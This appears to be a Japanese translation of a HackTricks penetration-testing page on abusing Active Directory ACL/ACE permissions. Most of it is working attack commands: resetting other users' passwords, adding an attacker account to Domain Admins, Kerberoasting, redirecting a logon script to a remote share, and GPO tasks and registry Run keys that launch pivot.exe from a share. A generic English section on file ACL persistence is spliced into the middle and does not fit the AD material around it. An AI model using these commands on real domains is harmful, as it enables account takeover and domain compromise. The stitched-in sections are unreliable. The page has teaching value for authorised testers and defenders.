# Active Directory ACL/ACEの悪用

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのスウェット**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは、攻撃対象の範囲を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリまで、クラウドシステムを含むテックスタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## コンテキスト

このラボは、Active DirectoryのDiscretionary Access Control Lists（DACL）およびAccess Control Entries（ACE）の弱い権限を悪用することを目的としています。

ユーザーやグループなどのActive Directoryオブジェクトは、セキュリティ可能なオブジェクトであり、DACL/ACEはそれらのオブジェクトを読み取る/変更することができるユーザーを定義します（アカウント名の変更、パスワードのリセットなど）。

「Domain Admins」セキュリティ可能なオブジェクトのACEの例は次のとおりです：

![](../../../.gitbook/assets/1.png)

攻撃者として興味があるいくつかのActive Directoryオブジェクトの権限とタイプ：

* **GenericAll** - オブジェクトへの完全なアクセス権（ユーザーをグループに追加したり、ユーザーのパスワードをリセットするなど）
* **GenericWrite** - オブジェクトの属性を更新する（ログオンスクリプトなど）
* **WriteOwner** - オブジェクトの所有者を攻撃者が制御するユーザーに変更し、オブジェクトを乗っ取る
* **WriteDACL** - オブジェクトのACEを変更し、攻撃者にオブジェクトの完全な制御権を与える
* **AllExtendedRights** - ユーザーをグループに追加したり、パスワードをリセットする能力
* **ForceChangePassword** - ユーザーのパスワードを変更する能力
* **Self（Self-Membership）** - 自分自身をグループに追加する能力

このラボでは、上記のACEのほとんどを探索し、悪用しようとします。

評価中に一般的でないものに遭遇する可能性があるため、[BloodHoundのエッジ](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)とActive Directoryの[拡張権限](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights)をすべて把握しておくことは価値があります。

## ユーザーに対するGenericAll

powerviewを使用して、攻撃者のユーザー`spotless`がユーザー`delegate`のADオブジェクトに対して`GenericAll権限`を持っているかどうかを確認しましょう：
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```
私たちは、実際にユーザー`spotless`が`GenericAll`権限を持っていることがわかります。これにより、攻撃者はアカウントを乗っ取ることができます。

![](../../../.gitbook/assets/2.png)

*   **パスワードの変更**: 以下のコマンドを使用して、ユーザーのパスワードを変更できます。

```bash
net user <username> <password> /domain
```
*   **ターゲット指定のKerberoasting**: アカウントに**SPN**を設定し、ユーザーを**kerberoastable**にすることができます。その後、オフラインでクラックを試みることができます。

```powershell
# SPNの設定
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
# ハッシュの取得
.\Rubeus.exe kerberoast /user:<username> /nowrap
# SPNのクリーンアップ
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

# また、ツールhttps://github.com/ShutdownRepo/targetedKerberoastを使用して、
# 1つまたはすべてのユーザーのハッシュを取得することもできます
python3 targetedKerberoast.py -domain.local -u <username> -p password -v
```
*   **ターゲット指定のASREPRoasting**: ユーザーの**preauthentication**を**無効化**して、ユーザーを**ASREPRoastable**にすることができます。

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

## グループのGenericAll

`Domain admins`グループに弱い権限があるかどうかを確認しましょう。まず、`distinguishedName`を取得しましょう。
```csharp
Get-NetGroup "domain admins" -FullData
```
![](../../../.gitbook/assets/4.png)
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
私たちの攻撃ユーザー`spotless`が再び`GenericAll`権限を持っていることがわかります：

![](../../../.gitbook/assets/5.png)

これにより、私たちは（ユーザー`spotless`として）`Domain Admin`グループに自分自身を追加することができます：
```csharp
net group "domain admins" spotless /add /domain
```
同じことはActive DirectoryまたはPowerSploitモジュールでも実現できます。
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Write on Computer/User

* もし、あなたが**コンピュータオブジェクト**にこれらの特権を持っている場合、[Kerberos **リソースベースの制約付き委任**: コンピュータオブジェクトの乗っ取り](../resource-based-constrained-delegation.md)を実行することができます。
* もし、あなたがユーザーにこれらの特権を持っている場合、[このページで説明されている最初の方法](./#genericall-on-user)のいずれかを使用することができます。
* または、コンピュータまたはユーザーのいずれかにこれらの特権がある場合、**シャドウクレデンシャル**を使用してそれをなりすますことができます:

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## GroupへのWriteProperty

制御されたユーザーが`Domain Admin`グループの`All`オブジェクトに対して`WriteProperty`権限を持っている場合:

![](../../../.gitbook/assets/7.png)

私たちは再び自分自身を`Domain Admins`グループに追加し、特権を昇格させることができます。
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/8.png)

## グループへの自己（自己メンバーシップ）の追加

攻撃者が自分自身をグループに追加することを可能にする別の特権：

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/10.png)

## WriteProperty（自己メンバーシップ）

攻撃者が自身をグループに追加することを可能にするもう1つの特権です。
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
# ACL Persistence Abuse

## Overview

ACL (Access Control List) Persistence Abuse is a technique used by attackers to maintain persistence on a compromised Windows system by manipulating the permissions of certain files or directories. By modifying the ACLs, an attacker can ensure that their malicious code or backdoor remains undetected and continues to execute even after system reboots or security updates.

## Methodology

1. **Identify target files or directories**: The first step is to identify the files or directories that are suitable for ACL manipulation. These are typically system files or directories that are frequently accessed or executed by the operating system or other applications.

2. **Analyze existing ACLs**: Next, analyze the existing ACLs of the target files or directories to understand the current permissions and access rights. This will help in identifying the specific ACLs that need to be modified.

3. **Modify ACLs**: Modify the ACLs of the target files or directories to grant the necessary permissions to the attacker's code or backdoor. This can be done using various methods, such as using the `icacls` command-line tool or programmatically through scripting.

4. **Test persistence**: Test the persistence by rebooting the system or triggering a security update. Ensure that the attacker's code or backdoor continues to execute without being detected.

5. **Maintain persistence**: To maintain persistence, periodically check and modify the ACLs if necessary. This will ensure that the attacker's code or backdoor remains active even after system changes or updates.

## Mitigation

To mitigate ACL Persistence Abuse, follow these best practices:

- Regularly review and audit the ACLs of critical system files and directories.
- Restrict permissions to only necessary users and groups.
- Implement strong password policies to prevent unauthorized access.
- Monitor system logs and network traffic for any suspicious activity.
- Keep the operating system and applications up to date with the latest security patches.

By following these practices, you can reduce the risk of ACL Persistence Abuse and enhance the security of your Windows systems.
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/12.png)

## **ForceChangePassword**

`User-Force-Change-Password`オブジェクトタイプの`ExtendedRight`を持っている場合、現在のパスワードを知らずにユーザーのパスワードをリセットすることができます。
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/13.png)

同じことをpowerviewで行う場合:
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
![](../../../.gitbook/assets/14.png)

パスワードの安全な文字列変換をいじる必要がない別の方法:
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
...または、対話型セッションが利用できない場合は、ワンライナーを使用します。
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

そして、Linuxからこれを達成する最後の方法は次のとおりです：
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
詳細情報：

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## グループの WriteOwner

攻撃前に `Domain Admins` の所有者が `Domain Admins` であることに注意してください：

![](../../../.gitbook/assets/17.png)

ACE 列挙後、制御下のユーザーが `ObjectType:All` に対して `WriteOwner` 権限を持っていることがわかった場合、
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/18.png)

...私たちは`Domain Admins`オブジェクトの所有者を私たちのユーザーである`spotless`に変更することができます。`-Identity`で指定されたSIDは`Domain Admins`グループのSIDです。
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
![](../../../.gitbook/assets/19.png)

## ユーザーに対するGenericWrite

### 概要

この攻撃手法では、Active Directory（AD）のアクセス制御リスト（ACL）の権限を悪用して、ユーザーオブジェクトに対してGenericWrite権限を与えます。GenericWrite権限は、ユーザーオブジェクトの属性を変更するために必要な権限です。この攻撃手法を使用すると、攻撃者はユーザーオブジェクトの属性を変更し、権限を拡大することができます。

### 攻撃手順

1. 攻撃者はActive Directory内のユーザーオブジェクトのACLを調査します。
2. 攻撃者は、ユーザーオブジェクトのACLに対してGenericWrite権限を追加します。
3. 攻撃者は、ユーザーオブジェクトの属性を変更し、権限を拡大します。

### 対策方法

この攻撃手法を防ぐためには、以下の対策を実施することが重要です。

- Active DirectoryのACLを定期的に監査し、不正な変更を検出する。
- ユーザーオブジェクトのACLに対して適切な権限を設定し、不要な権限を削除する。
- セキュリティポリシーを適用し、不正な変更を防止する。

### 参考情報

- [Active Directoryのアクセス制御リスト（ACL）](https://docs.microsoft.com/ja-jp/windows/security/identity-protection/access-control/active-directory-acls)
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/20.png)

`ObjectType`の`WriteProperty`は、この特定の場合では`Script-Path`です。これにより、攻撃者は`delegate`ユーザーのログオンスクリプトパスを上書きすることができます。つまり、次回`delegate`ユーザーがログオンすると、システムは私たちの悪意のあるスクリプトを実行します。
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
以下は、ユーザーの~~`delegate`~~ログオンスクリプトフィールドがADで更新されたことを示しています：

![](../../../.gitbook/assets/21.png)

## グループのGenericWrite

これにより、新しいユーザー（例えば、自分自身）をグループのメンバーとして設定できます：
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは攻撃対象を追跡し、予防的な脅威スキャンを実行し、APIからWebアプリやクラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## WriteDACL + WriteOwner

もし私が`Test` ADグループのオーナーである場合：

![](../../../.gitbook/assets/22.png)

もちろん、PowerShellを使用してもできます：
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
![](../../../.gitbook/assets/23.png)

そして、そのADオブジェクトには`WriteDACL`があります:

![](../../../.gitbook/assets/24.png)

...ADSIの魔法を使って、自分自身に[`GenericAll`](../../../windows/active-directory-methodology/broken-reference/)特権を与えることができます:
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
これは、ADオブジェクトを完全に制御できることを意味します：

![](../../../.gitbook/assets/25.png)

これにより、新しいユーザーをグループに追加することができます。

興味深いことに、Active Directoryモジュールと`Set-Acl` / `Get-Acl`コマンドレットを使用してこれらの特権を悪用することはできませんでした：
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
![](../../../.gitbook/assets/26.png)

## **ドメイン上でのレプリケーション（DCSync）**

**DCSync**権限は、ドメイン自体に対して次の権限を持つことを意味します：**DS-Replication-Get-Changes**、**Replicating Directory Changes All**、および**Replicating Directory Changes In Filtered Set**。\
[**DCSync攻撃について詳しくはこちらをご覧ください。**](../dcsync.md)

## GPOの委任 <a href="#gpo-delegation" id="gpo-delegation"></a>

時には、特定のユーザー/グループがGroup Policy Objectsを管理するためにアクセスを委任される場合があります。例えば、`offense\spotless`ユーザーの場合です：

![](../../../.gitbook/assets/a13.png)

PowerViewを活用することで、これを確認することができます：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
以下は、ユーザー`offense\spotless`が**WriteProperty**、**WriteDacl**、**WriteOwner**の特権を持っていることを示しています。他にも悪用される可能性のある特権がいくつかあります。

![](../../../.gitbook/assets/a14.png)

### GPOの権限を列挙する <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

上記のスクリーンショットから、ObjectDNが`CN=Policies`を指し、またGPOの設定でハイライトされている`CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`と同じであるため、上記のObjectDNは`New Group Policy Object` GPOを指していることがわかります。

![](../../../.gitbook/assets/a15.png)

特定の設定ミスのあるGPOを検索したい場合は、PowerSploitの複数のコマンドレットを以下のように連鎖させることができます。
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/a16.png)

**指定されたポリシーが適用されたコンピューター**

次に、GPO「Misconfigured Policy」が適用されているコンピューター名を解決できます。
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
![](../../../.gitbook/assets/a17.png)

**特定のコンピュータに適用されるポリシー**
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

**指定されたポリシーが適用されたOU**
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **GPOの乱用 -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

この設定の乱用とコードの実行を行う方法の一つは、次のようにGPOを介して即時スケジュールされたタスクを作成することです:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

上記のコードは、ユーザーspotlessを侵害されたボックスのローカルの`administrators`グループに追加します。コードの実行前に、グループにはユーザー`spotless`が含まれていないことに注意してください。

![](../../../.gitbook/assets/a20.png)

### GroupPolicyモジュール **- GPOの乱用**

{% hint style="info" %}
GroupPolicyモジュールがインストールされているかどうかを確認するには、`Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`を使用できます。必要な場合は、ローカル管理者として`Install-WindowsFeature –Name GPMC`でインストールすることもできます。
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
このペイロードは、GPOが更新された後、コンピュータ内でログインする必要があります。

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- GPOの乱用**

{% hint style="info" %}
GPOを作成することはできないため、引き続きRSATを使用するか、すでに書き込みアクセス権限を持っているGPOを変更する必要があります。
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### ポリシーの強制更新 <a href="#force-policy-update" id="force-policy-update"></a>

前回の乱用された **GPOの更新はおおよそ90分ごとに再読み込み** されます。\
コンピュータにアクセスできる場合は、`gpupdate /force` で強制的に更新することができます。

### 内部構造 <a href="#under-the-hood" id="under-the-hood"></a>

`Misconfigured Policy` GPOのスケジュールされたタスクを観察すると、`evilTask` がそこに存在していることがわかります:

![](../../../.gitbook/assets/a22.png)

以下は、GPO内の私たちの邪悪なスケジュールされたタスクを表す `New-GPOImmediateTask` によって作成されたXMLファイルです:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
<Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
<Task version="1.3">
<RegistrationInfo>
<Author>NT AUTHORITY\System</Author>
<Description></Description>
</RegistrationInfo>
<Principals>
<Principal id="Author">
<UserId>NT AUTHORITY\System</UserId>
<RunLevel>HighestAvailable</RunLevel>
<LogonType>S4U</LogonType>
</Principal>
</Principals>
<Settings>
<IdleSettings>
<Duration>PT10M</Duration>
<WaitTimeout>PT1H</WaitTimeout>
<StopOnIdleEnd>true</StopOnIdleEnd>
<RestartOnIdle>false</RestartOnIdle>
</IdleSettings>
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
<AllowHardTerminate>false</AllowHardTerminate>
<StartWhenAvailable>true</StartWhenAvailable>
<AllowStartOnDemand>false</AllowStartOnDemand>
<Enabled>true</Enabled>
<Hidden>true</Hidden>
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
<Priority>7</Priority>
<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
<RestartOnFailure>
<Interval>PT15M</Interval>
<Count>3</Count>
</RestartOnFailure>
</Settings>
<Actions Context="Author">
<Exec>
<Command>cmd</Command>
<Arguments>/c net localgroup administrators spotless /add</Arguments>
</Exec>
</Actions>
<Triggers>
<TimeTrigger>
<StartBoundary>%LocalTimeXmlEx%</StartBoundary>
<EndBoundary>%LocalTimeXmlEx%</EndBoundary>
<Enabled>true</Enabled>
</TimeTrigger>
</Triggers>
</Task>
</Properties>
</ImmediateTaskV2>
</ScheduledTasks>
```
{% endcode %}

### ユーザーとグループ <a href="#users-and-groups" id="users-and-groups"></a>

同じ特権昇格は、GPOのユーザーとグループ機能を悪用することで達成することができます。以下のファイルの6行目に注目してください。ここでは、ユーザー`spotless`がローカルの`administrators`グループに追加されています。私たちはユーザーを他のものに変更したり、別のユーザーを追加したり、ユーザーを別のグループ/複数のグループに追加したりすることができます。なぜなら、GPOの委任が私たちのユーザー`spotless`に割り当てられているため、表示される場所のポリシー設定ファイルを変更することができるからです。

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
<Members>
<Member name="spotless" action="ADD" sid="" />
</Members>
</Properties>
</Group>
</Groups>
```
{% endcode %}

さらに、ログオン/ログオフスクリプトを活用したり、レジストリを使用して自動実行を行ったり、.msiをインストールしたり、サービスを編集したりすることも考えられます。

## 参考文献

* この情報は主に[https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)からコピーされました。
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より迅速に修正できます。Intruderは攻撃対象を追跡し、予防的な脅威スキャンを実行し、APIからWebアプリ、クラウドシステムまで、テックスタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
